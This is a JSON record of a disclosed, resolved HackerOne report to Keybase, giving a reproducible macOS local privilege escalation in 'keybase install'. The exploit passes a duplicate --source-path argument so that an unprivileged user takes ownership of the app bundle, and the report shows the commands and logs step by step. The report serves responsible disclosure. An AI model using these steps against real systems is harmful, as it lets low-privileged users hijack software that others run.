{
  "id": 471739,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzE3Mzk=",
  "url": "https://hackerone.com/reports/471739",
  "title": "macOS privilege escalation via keybase install",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2018-12-24T18:02:12.623Z",
  "submitted_at": "2018-12-24T18:02:12.623Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mirchr",
    "url": "/mirchr",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/8shgv1i94snku36hm70ncflgl95o/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58?response-content-disposition=inline%3B%20filename%3D%22tw-pic.jpeg%22%3B%20filename%2A%3DUTF-8%27%27tw-pic.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4ABT4GR%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131546Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBy6B6CaeGOQsHQEVf6mmFMeFsyrU6xwojWydbGY7RrjAiEAt098VbuwY4XR0q%2FhT1%2BwOM5SQIHiByhn7YH5ul9I%2Bn0qsQUIdRADGgwwMTM2MTkyNzQ4NDkiDFBaVga66U2cxXTWDSqOBZ9tNE39KmDEn1M4BXloMcPBeBllafRlZWXN4mbzGTLJ8XKW77G1i6rQMiYeX0mALiTgT6%2BCHJg%2FXOkgcCoWTiU8AGVS8ygbrG6Rmef84ITNYSRHXYOiAmAtLriRM0FNkbvdPDxzRHKptbdJe%2FxQx6iHxnF4Wbz2d%2BiPKmLG1dOUk9Wd5PcY6e%2FpFK3MQHhbP60DtFaNSQZiLijq7McbVpknudWszl6E666zMtQlGzHcdmQhcfLUGV%2Fh2eQIW07Q8StsP0DnifOlRfH5wmBWZeOVGiQmAiu4vix6Kx70b5sEUa60B8XEzX3iLRbRpvoMJI2iFfwEhBUfyAO2kQFI891jfDtZMWBRAeJzS2TDBSZOFWdllL1Ku5BlluxzcTwgDBcj6U9BeRoIR%2FE%2F%2FzJhFrI6sO4C9sHXlsgFD4n6%2BV%2BMht3eSvRmwlqvwAGbQgoXg1TnmoDMTwU9bHj7KKScAqVQBI8hZ2NsP8SjJg8QJ0z%2BQTTuA8uOznjEUpW73jDmEQTBVhmpeZcwxP4%2BU6nQB8LguHWkl5NBmrNRrQGJGWsRxHHT40HVpMkdUBcHLz%2BE4kW3xThQV2%2FnlNJrQbkP9idnhRNm421huVhZIih2gBVsmfHNfFtpBWAgyhZal1fyaA5PfM8x1h1HAwbgAbx5pWpwX6P35EkSqglhC9hYX4Mx81Hh8c9ng5X9OnjAGOW2svJkxKq9ucSCCtD2ch3QThvWYUo6MweIyhK%2Fc7x1IsUKbcstBILZpn1l%2BukPwZKsmW0eclxFPYN5toUHjUictBuWWthA5Xkwhoewwr4uhuDUwpqTTEYBtxfAUMWwC9b4A0nNdO5YVjG1Et5gL7AXZuOawjRSr2cgQxq4C6b5gjDCs62uBjqxAShKZyKgt2m88YD0Vj8P6tXU495dvL8RKU8No53RBpg%2B0AGbaXTXUqyqWqfJgpK4Oo5BMDBxlCeUem5zsmh5i1y96ARljDRINVqBbClSxSFkigseR0xhxtkfysRfAXQQYk56acdX1y%2FUUtxG304UkKPWzZsl%2FZfaTuT815tCTUHh387Az8zDogkBD5OMCSblOcOAbl2D84THnFg9dMo8QXW7aVKysLeRwOxI5twdQX9Gug%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f2701a45eb52ae0cad95c56f1e243bf1270586ad8fd8d4c1dc36f8814bda7054"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 2809,
    "url": "https://hackerone.com/keybase",
    "handle": "keybase",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Keybase",
      "twitter_handle": "keybaseio",
      "website": "https://keybase.io",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-01-30T18:33:06.626Z",
  "bug_reporter_agreed_on_going_public_at": "2019-01-30T18:33:06.556Z",
  "team_member_agreed_on_going_public_at": "2019-01-30T18:14:59.043Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Environment\nOS: macOS Mojave 10.14.1\nKernel: Darwin Kernel Version 18.2.0\n\nkeybase version 2.12.2-20181218171841+29273f4110\n\n### Steps to reproduce\n\nNote: All steps are executed as an unprivileged user unless otherwise noted.\n\nFor this PoC the unprivileged user is defined as below\n```\n$ id test2\nuid=508(test2) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),100(_lpoperator),701(com.apple.sharepoint.group.1),703(com.apple.sharepoint.group.3),702(com.apple.sharepoint.group.2)\n```\n\n1) Show that the application files are owned by the admin user who installed it\n```\n$ ls -ld /Applications/Keybase.app /Applications/Keybase.app/Contents/MacOS/Keybase /Applications/Keybase.app/Contents/SharedSupport/bin/keybase\ndrwxr-xr-x@ 3 admin  admin        96 Dec 18 11:25 /Applications/Keybase.app\n-rwxr-xr-x@ 1 admin  admin     27680 Dec 18 11:25 /Applications/Keybase.app/Contents/MacOS/Keybase\n-rwxr-xr-x@ 1 admin  admin  85209360 Dec 18 11:25 /Applications/Keybase.app/Contents/SharedSupport/bin/keybase\n```\n\n2) Manually download the latest release version\n```\nwget https://prerelease.keybase.io/darwin-updates/Keybase-2.12.2-20181218171841%2B29273f4110.zip\n```\n3) Extract the application\n\nunzip Keybase-2.12.2-20181218171841+29273f4110.zip\n\n4) Execute the Keybase Application. Logging in is not necessary.\n```\n/Applications/Keybase.app/Contents/MacOS/Keybase # or use Finder\n```\n5) Execute keybase install pointing the source-path to the location of the unzipped application. The key here is to pass two --source-path options with the the first occurrence pointing to an invalid path.\n```\n# line breaks added for readability\n/Applications/Keybase.app/Contents/SharedSupport/bin/keybase -d install \\\n-f \\\n--source-path=/does/not/exist \\\n-c app \\\n--source-path=$PWD/Keybase.app\n```\n\nLog output\n```\n2018-12-24T11:39:03.086210-06:00 ▶ [DEBU keybase globals.go:491] 001 Created Identify2Cache, max age: 5m0s\n2018-12-24T11:39:03.086338-06:00 ▶ [DEBU keybase globals.go:494] 002 Created LinkCache, max size: 4000, clean dur: 1m0s\n2018-12-24T11:39:03.086395-06:00 ▶ [DEBU keybase globals.go:496] 003 Created CardCache, max age: 5m0s\n2018-12-24T11:39:03.086438-06:00 ▶ [DEBU keybase globals.go:514] 004 made a new full self cache\n2018-12-24T11:39:03.087220-06:00 ▶ [DEBU keybase globals.go:516] 005 made a new cached UPAK loader (timeout=10m0s)\n2018-12-24T11:39:03.091820-06:00 ▶ [DEBU keybase ui.go:614] 006 Setting GPG_TTY to /dev/ttys005\n2018-12-24T11:39:03.091980-06:00 ▶ [DEBU keybase secret_store.go:153] 007 NewSecretStoreLocked: using os-specific SecretStore\n2018-12-24T11:39:03.092051-06:00 ▶ [DEBU keybase globals.go:427] 008 Keybase CLI 2.12.2-20181218171841+29273f4110\n2018-12-24T11:39:03.092074-06:00 ▶ [DEBU keybase globals.go:427] 009 - Built with go1.10.3\n2018-12-24T11:39:03.092087-06:00 ▶ [DEBU keybase globals.go:427] 00a - Visit https://keybase.io for more details\n2018-12-24T11:39:03.100194-06:00 ▶ [DEBU keybase main.go:208] 00b + configureProcesses\n2018-12-24T11:39:03.100289-06:00 ▶ [DEBU keybase main.go:319] 00c + configureLogging\n2018-12-24T11:39:03.100327-06:00 ▶ [DEBU keybase main.go:328] 00d Disabling log forwarding\n2018-12-24T11:39:03.100343-06:00 ▶ [DEBU keybase main.go:321] 00e - configureLogging\n2018-12-24T11:39:03.100357-06:00 ▶ [DEBU keybase main.go:210] 00f - configureProcesses -> <nil>\n2018-12-24T11:39:03.100520-06:00 ▶ [DEBU keybase install_darwin.go:484] 010 Installing components: [app]\n2018-12-24T11:39:03.100586-06:00 ▶ [INFO keybase app.go:142] 011 Install app bundle\n2018-12-24T11:39:06.975310-06:00 ▶ [DEBU keybase app.go:77] 012 Output ([--debug --run-mode=prod --app-path=/Applications/Keybase.app --timeout=10 --install-app-bundle --source-path=/Users/test2/update/Keybase.app]): 12.24.2018 11:39:03.244 Installer:56[DEBG] Version: 1.1.64\n12.24.2018 11:39:03.277 KBInstaller:27[DEBG] Installables: (\n    \"Privileged Helper\",\n    App\n)\n12.24.2018 11:39:03.277 KBInstaller:32[DEBG] Install: Privileged Helper\n12.24.2018 11:39:03.278 KBHelperTool:73[INFO] Connecting to keybase.Helper (privileged=1)\n12.24.2018 11:39:03.278 KBHelperTool:73[INFO] Connected\n12.24.2018 11:39:03.499 KBHelperTool:118[DEBG] Helper version: {\n    build = 3;\n    version = \"1.0.32\";\n}\n12.24.2018 11:39:03.523 KBHelperTool:118[DEBG] Helper version: {\n    build = 3;\n    version = \"1.0.32\";\n}\n12.24.2018 11:39:03.532 KBInstaller:32[DEBG] Install: App\n12.24.2018 11:39:03.532 KBAppBundle:82[INFO] Checking security requirements\n12.24.2018 11:39:05.164 KBAppBundle:89[INFO] Copying app bundle /Users/test2/update/Keybase.app to /Applications/Keybase.app\n12.24.2018 11:39:05.544 KBAppBundle:98[INFO] Checking destination\n12.24.2018 11:39:06.969 KBInstaller:45[INFO] Install complete\n12.24.2018 11:39:06.969 KBInstaller:49[INFO] Privileged Helper: Installed, Bundle Version: 1.0.32\nVersion: 1.0.32\n12.24.2018 11:39:06.969 KBInstaller:49[INFO] App:\n12.24.2018 11:39:06.969 Installer:96[INFO] Exit(0)\n2018-12-24T11:39:06.975976-06:00 ▶ [DEBU keybase out_of_date.go:14] 013 + PrintOutOfDateWarnings\n2018-12-24T11:39:06.976240-06:00 ▶ [DEBU keybase socket.go:65] 014 + GetSocket\n2018-12-24T11:39:06.976593-06:00 ▶ [DEBU keybase rpc.go:25] 015 - GetSocket -> ok\n2018-12-24T11:39:06.976753-06:00 ▶ [DEBU keybase socket.go:75] 016 | empty socket wrapper; need a new one\n2018-12-24T11:39:06.976818-06:00 ▶ [DEBU keybase socket_nix.go:100] 017 + SocketInfo#dialSocket(unix:/Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock)\n2018-12-24T11:39:06.976889-06:00 ▶ [DEBU keybase socket_nix.go:124] 018 | net.Dial(unix:/Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock)\n2018-12-24T11:39:06.977905-06:00 ▶ [DEBU keybase socket_nix.go:125] 019 - SocketInfo#dialSocket(unix:/Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock) -> ERROR: dial unix /Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock: connect: no such file or directory\n2018-12-24T11:39:06.977981-06:00 ▶ [DEBU keybase socket_nix.go:100] 01a + SocketInfo#dialSocket(unix:/Users/test2/Library/Caches/Keybase/keybased.sock)\n2018-12-24T11:39:06.978016-06:00 ▶ [DEBU keybase socket_nix.go:124] 01b | net.Dial(unix:/Users/test2/Library/Caches/Keybase/keybased.sock)\n2018-12-24T11:39:06.978187-06:00 ▶ [DEBU keybase socket_nix.go:125] 01c - SocketInfo#dialSocket(unix:/Users/test2/Library/Caches/Keybase/keybased.sock) -> ERROR: dial unix /Users/test2/Library/Caches/Keybase/keybased.sock: connect: no such file or directory\n2018-12-24T11:39:06.978270-06:00 ▶ [DEBU keybase socket.go:90] 01d | DialSocket -> ERROR: There were multiple errors: dial unix /Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock: connect: no such file or directory; dial unix /Users/test2/Library/Caches/Keybase/keybased.sock: connect: no such file or directory\n2018-12-24T11:39:06.978299-06:00 ▶ [DEBU keybase out_of_date.go:19] 01e Ignoring error in printOutOfDateWarnings: There were multiple errors: dial unix /Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock: connect: no such file or directory; dial unix /Users/test2/Library/Caches/Keybase/keybased.sock: connect: no such file or directory\n2018-12-24T11:39:06.978386-06:00 ▶ [DEBU keybase out_of_date.go:20] 01f - PrintOutOfDateWarnings\n2018-12-24T11:39:07.090071-06:00 ▶ [DEBU keybase globals.go:657] 020 GlobalContext#Shutdown(0xc4203a5400)\n2018-12-24T11:39:07.090332-06:00 ▶ [DEBU keybase globals.go:701] 021 exiting shutdown code=0; err=<nil>\n```\n6) Verify the permissions of keybase. The low privileged test2 user now owns all files under /Applications/Keybase.app. At this point the low privileged user has full control of all binaries and configuration files. These files could be modified by a malicious low privileged user to install a trojan horse to execute arbitrary code as an unsuspecting user. I believe there could also be a path to arbitrary code execution as root but additional research is necessary.\n```\n$ ls -ld /Applications/Keybase.app /Applications/Keybase.app/Contents/MacOS/Keybase /Applications/Keybase.app/Contents/SharedSupport/\ndrwxr-xr-x  3 test2  staff     96 Dec 18 11:25 /Applications/Keybase.app\n-rwxr-xr-x  1 test2  staff  27680 Dec 18 11:25 /Applications/Keybase.app/Contents/MacOS/Keybase\ndrwxr-xr-x  3 test2  staff     96 Dec 18 11:25 /Applications/Keybase.app/Contents/SharedSupport/\n```\n\n## Impact\n\nArbitrary code execution as any user running Keybase is possible which impacts the confidentially, integrity, and availability of the system and users.",
  "bounty_amount": "1250.0",
  "formatted_bounty": "$1,250",
  "weakness": {
    "id": 75,
    "name": "Privilege Escalation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 12,
  "voters": [
    "mirchr",
    "bl4de",
    "ali",
    "asad0x01_",
    "khizer47",
    "codeanddecode",
    "cyberunit",
    "cryptographer",
    "omespino",
    "b73772bded7541989b54f6a",
    "and 2 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 6.3,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "low"
    }
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
